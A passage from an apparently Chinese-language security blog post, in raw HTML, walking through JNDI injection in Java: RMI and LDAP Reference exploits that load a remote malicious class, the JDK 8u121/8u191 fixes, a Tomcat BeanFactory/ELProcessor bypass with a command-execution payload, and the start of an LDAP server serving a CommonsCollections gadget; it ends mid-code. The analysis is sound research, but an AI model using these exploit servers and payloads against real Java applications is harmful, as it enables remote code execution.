javax.naming.Reference;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Server</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String  url = <span class=\"string\">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class=\"line\">        Registry r = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        Reference reference = <span class=\"keyword\">new</span> Reference(<span class=\"string\">&quot;calc&quot;</span>, <span class=\"string\">&quot;calc&quot;</span>, url);</span><br><span class=\"line\">        ReferenceWrapper referenceWrapper = <span class=\"keyword\">new</span> ReferenceWrapper(reference);</span><br><span class=\"line\">        r.bind(<span class=\"string\">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Client端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.InitialContext;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Client</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;</span><br><span class=\"line\">        InitialContext initialContext = <span class=\"keyword\">new</span> InitialContext();</span><br><span class=\"line\">        initialContext.lookup(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>calc.java，编译为class，放到web服务下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">calc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>启动服务端、客户端后弹出计算器。</p>\n<h2 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h2><p>断点下到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">initialContext.lookup(url);</span><br></pre></td></tr></table></figure>\n\n<p>走到 <strong>RegistryContext#lookup</strong> ，通过registryImpl_Stub去寻找evil，返回值为一个 <strong>ReferenceWrapper</strong> 对象，接着调用当前类的<strong>decodeObject</strong> 去获取其中的信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714183414297.png\" alt=\"image-20220714183414297\"></p>\n<p>调用 <strong>getReference</strong> 获取信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714183745369.png\" alt=\"image-20220714183745369\"></p>\n<p>看到已经获取详细的信息了，随后调用静态方法 <strong>NamingManager#getObjectInstance</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184051614.png\" alt=\"image-20220714184051614\"></p>\n<p> <strong>getObjectInstance</strong> 中定义 <strong>ObjectFactory</strong> 类型的 <strong>factory</strong> 用于接受工厂类的对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220717231849391.png\" alt=\"image-20220717231849391\"></p>\n<p>然后调用 <strong>getObjectFactoryFromReference</strong> 去获取 <strong>工厂类的对象</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184416349.png\" alt=\"image-20220714184416349\"></p>\n<p>getObjectFactoryFromReference 中首先直接尝试类加载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184651459.png\" alt=\"image-20220714184651459\"></p>\n<p>那么在类加载的过程中使用AppClassLoader加载，本地肯定是没有的，返回空</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184850343.png\" alt=\"image-20220714184850343\"></p>\n<p>本地没有找到类接着调用 <strong>Reference#getFactoryClassLocation</strong> 赋值给 codebase ，也就是获取远程调用的地址，并再次类加载，这回用 <strong>URLClassLoader</strong>去进行加载。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714185348698.png\" alt=\"image-20220714185348698\"></p>\n<p>这样就能获取到远程的恶意类，并且进行初始化的类加载，执行静态代码块。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714185440971.png\" alt=\"image-20220714185440971\"></p>\n<p>一路返回到 getObjectFactoryFromReference，最后会实例化返回一个对象，所以恶意代码还可以写到构造函数中。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714185626149.png\" alt=\"image-20220714185626149\"></p>\n<p>返回到 <strong>factory</strong> 后，调用其 <strong>getObjectInstance</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715013540301.png\" alt=\"image-20220715013540301\"></p>\n<h2 id=\"修补\"><a href=\"#修补\" class=\"headerlink\" title=\"修补\"></a>修补</h2><p>上面提到说，JDK 6u141、7u131、8u121之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞。</p>\n<p>切换版本为jdk8u181，在RegistryContext中，会判断 trustURLCodebase</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714232650954.png\" alt=\"image-20220714232650954\"></p>\n<p>默认为false，默认情况下就抛出异常。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714233203175.png\" alt=\"image-20220714233203175\"></p>\n<p>但是在8u191之前都是可以通过LDAP进行绕过的，下面跟一下ldap的流程。</p>\n<h1 id=\"JNDI-LDAP\"><a href=\"#JNDI-LDAP\" class=\"headerlink\" title=\"JNDI-LDAP\"></a>JNDI-LDAP</h1><h2 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>ldap用代码实现比较多(下面8u191代码实现ldap)，这里直接用工具 marshalsec 启动代替LDAP服务。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;#calc</span><br></pre></td></tr></table></figure>\n\n<p>Client端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.InitialContext;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Client</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;ldap://127.0.0.1:1389/aa&quot;</span>;</span><br><span class=\"line\">        InitialContext initialContext = <span class=\"keyword\">new</span> InitialContext();</span><br><span class=\"line\">        initialContext.lookup(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"流程分析-1\"><a href=\"#流程分析-1\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h2><p><strong>LdapCtx#c_lookup</strong> 走到decodeObject，和上面作用一样，进行解析</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715001340200.png\" alt=\"image-20220715001340200\"></p>\n<p>感觉这里应该还会有利用点，学懂了在研究吧。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715001757440.png\" alt=\"image-20220715001757440\"></p>\n<p>可以看到解析出来后为Reference对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715001919622.png\" alt=\"image-20220715001919622\"></p>\n<p>然后调用 <strong>DirectoryManager#getObjectInstance</strong> 去获取实例，对照着RMI的修补就知道，这里没有进行限制。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715002006872.png\" alt=\"image-20220715002006872\"></p>\n<p>剩下的类似RMI，getObjectFactoryFromReference-&gt;loadClass</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715002429400.png\" alt=\"image-20220715002429400\"></p>\n<p>类加载完毕后返回实例，同样调用其 <strong>工厂类对象的getObjectInstance</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715012834856.png\" alt=\"image-20220715012834856\"></p>\n<h2 id=\"修补-1\"><a href=\"#修补-1\" class=\"headerlink\" title=\"修补\"></a>修补</h2><p>8u191之后进行了修补， loadClass方法中添加 trustURLCodebase 属性，所以不能远程加载了。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220715023443502.png\" alt=\"image-20220715023443502\"></p>\n<h1 id=\"8u191的绕过\"><a href=\"#8u191的绕过\" class=\"headerlink\" title=\"8u191的绕过\"></a>8u191的绕过</h1><p>针对8u191的绕过大致两种途径</p>\n<ol>\n<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>\n<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>\n</ol>\n<p>第一种思路，既然远程不能打，就寻找本地的工厂类的有没有可能存在利用点，我们返回的Reference对象中包含本地存在的可利用Factory类，然后在loadClass后，创建实例对象，调用其 getObjectInstance 方法，当然了Factory类需要实现  <strong>javax.naming.spi.ObjectFactory</strong>  接口，还要重写其 getObjectInstance 方法。比如现在有这么一个Factory中，它的静态代码块或者无参构造方法等存在利用点，它的 getObjectInstance 存在利用点，我们直接返回Reference对象就可以加以利用。</p>\n<p>第二种思路，通过LDAP的 javaSerializedData反序列化gadget。LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。</p>\n<h2 id=\"简单例子\"><a href=\"#简单例子\" class=\"headerlink\" title=\"简单例子\"></a>简单例子</h2><p>Server端创建rmi服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Reference reference &#x3D; new Reference(&quot;Test&quot;,&quot;Test&quot;,null);</span><br></pre></td></tr></table></figure>\n\n<p>Client端存在一个Factory</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Context;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Name;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.spi.ObjectFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectFactory</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;静态代码&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;无参构造方法&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;构造代码块&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObjectInstance</span><span class=\"params\">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;getObjectInstance&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当client端发起lookup请求后，结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">静态代码</span><br><span class=\"line\">构造代码块</span><br><span class=\"line\">无参构造方法</span><br><span class=\"line\">getObjectInstance</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"利用本地Class\"><a href=\"#利用本地Class\" class=\"headerlink\" title=\"利用本地Class\"></a>利用本地Class</h2><p>目前公开常用的利用方法是通过 <strong>Tomcat</strong> 的 <strong>org.apache.naming.factory.BeanFactory</strong> 工厂类去调用 <strong>javax.el.ELProcessor#eval</strong> 方法或 <strong>groovy.lang.GroovyShell#evaluate</strong> 方法</p>\n<p><strong>BeanFactory</strong> 的利用原理如下</p>\n<blockquote>\n<p>org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>\n</blockquote>\n<p>pom.xml都添加上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;tomcat-dbcp&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;9.0.8&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;tomcat-catalina&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;9.0.8&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;tomcat-jasper&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;9.0.8&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Server端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.naming.ResourceRef;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.StringRefAddr;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Server</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Registry r = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        ResourceRef ref = <span class=\"keyword\">new</span> ResourceRef(<span class=\"string\">&quot;javax.el.ELProcessor&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"keyword\">true</span>,<span class=\"string\">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        ref.add(<span class=\"keyword\">new</span> StringRefAddr(<span class=\"string\">&quot;forceString&quot;</span>, <span class=\"string\">&quot;x=eval&quot;</span>));</span><br><span class=\"line\">        ref.add(<span class=\"keyword\">new</span> StringRefAddr(<span class=\"string\">&quot;x&quot;</span>, <span class=\"string\">&quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\\&quot;)&quot;</span>));</span><br><span class=\"line\">        ReferenceWrapper referenceWrapper = <span class=\"keyword\">new</span> ReferenceWrapper(ref);</span><br><span class=\"line\">        r.bind(<span class=\"string\">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;running&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"流程分析-2\"><a href=\"#流程分析-2\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h3><p>先看一下 <strong>BeanFactory#getObjectInstance</strong></p>\n<p>首先要求传入的类型为 <strong>ResourceRef</strong> ，所以Server端才这样构造</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718144626385.png\" alt=\"image-20220718144626385\"></p>\n<p>看一下 ResourceRef 的构造函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718144846588.png\" alt=\"image-20220718144846588\"></p>\n<p>调用父类构造方法，最后结果如下</p>\n<ul>\n<li>classFactory = factory (org.apache.naming.factory.BeanFactory)</li>\n<li>classFactoryLocation = null</li>\n<li>className = resourceClass (javax.el.ELProcessor)</li>\n</ul>\n<p>Client端接受Reference后实例 BeanFactory 对象，调用其 getObjectInstance 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718145434845.png\" alt=\"image-20220718145434845\"></p>\n<p>跟进 <strong>BeanFactory#getObjectInstance</strong> 获取beenClass即ELprocessor，通过类加载器进行类加载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718145804608.png\" alt=\"image-20220718145804608\"></p>\n<p>调用无参构造方法去实例化对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718145958151.png\" alt=\"image-20220718145958151\"></p>\n<p>接着从Reference对象的addrs参数集合中获取其 addrType 是 forceString 的参数赋值给value</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220810123453393.png\" alt=\"image-20220810123453393\"></p>\n<p>for循环去遍历value，按照<code>,</code>分割成多个要执行的方法，如果有 <strong>=</strong> 进行截取，等号前面赋值给param，后面赋值给 setterName，相当于拆分为键值对</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718150525075.png\" alt=\"image-20220718150525075\"></p>\n<p>在beenclass中获取”键值名”的方法，把键名和对应的方法放到 forced中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718150820408.png\" alt=\"image-20220718150820408\"></p>\n<p>获取出不在if条件中的其他值，这里获取到的即 x，赋值给 propName</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()\\&quot;)&quot;));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718151126979.png\" alt=\"image-20220718151126979\"></p>\n<p>最后会根据 propName 作为方法名称去反射获取一个参数类型是 **String.class(value)**的方法，并按照 param 从 addrs 中取到的 String 对象作为参数去反射调用该方法。</p>\n<p>从 forced 中 获取 x 所代表的method，然后进行反射调用命令执行。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718151253037.png\" alt=\"image-20220718151253037\"></p>\n<h2 id=\"LDAP返回对象\"><a href=\"#LDAP返回对象\" class=\"headerlink\" title=\"LDAP返回对象\"></a>LDAP返回对象</h2><p>pox.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;com.unboundid&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;unboundid-ldapsdk&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;3.1.1&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Server端，打CC5</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ServerSocketFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.SocketFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Server</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String LDAP_BASE = <span class=\"string\">&quot;dc=example,dc=com&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span> <span class=\"params\">( String[] tmp_args )</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        String[] args=<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;http://192.168.68.155/#test&quot;</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> port = <span class=\"number\">1389</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        InMemoryDirectoryServerConfig config = <span class=\"keyword\">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class=\"line\">        config.setListenerConfigs(<span class=\"keyword\">new</span> InMemoryListenerConfig(</span><br><span class=\"line\">                <span class=\"string\">&quot;listen&quot;</span>, <span class=\"comment\">//$NON-NLS-1$</span></span><br><span class=\"line\">                InetAddress.getByName(<span class=\"string\">&quot;0.0.0.0&quot;</span>), <span class=\"comment\">//$NON-NLS-1$</span></span><br><span class=\"line\">                port,</span><br><span class=\"line\">                ServerSocketFactory.getDefault(),</span><br><span class=\"line\">                SocketFactory.getDefault(),</span><br><span class=\"line\">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class=\"line\"></span><br><span class=\"line\">        config.addInMemoryOperationInterceptor(<span class=\"keyword\">new</span> OperationInterceptor(<span class=\"keyword\">new</span> URL(args[ <span class=\"number\">0</span> ])));</span><br><span class=\"line\">        InMemoryDirectoryServer ds = <span class=\"keyword\">new</span> InMemoryDirectoryServer(config);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class=\"comment\">//$NON-NLS-1$</span></span><br><span class=\"line\">        ds.startListening();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OperationInterceptor</span> <span class=\"keyword\">extends</span> <span class=\"title\">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">private</span> URL codebase;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">OperationInterceptor</span> <span class=\"params\">( URL cb )</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.codebase = cb;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">processSearchResult</span> <span class=\"params\">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class=\"line\">            String base = result.getRequest().getBaseDN();</span><br><span class=\"line\">            Entry e = <span class=\"keyword\">new</span> Entry(base);</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                sendResult(result, base, e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">catch</span> ( Exception e1 ) &#123;</span><br><span class=\"line\">                e1.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">sendResult</span> <span class=\"params\">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">            URL turl = <span class=\"keyword\">new</span> URL(<span class=\"keyword\">this</span>.codebase, <span class=\"keyword\">this</span>.codebase.getRef().replace(<span class=\"string\">&#x27;.&#x27;</span>, <span 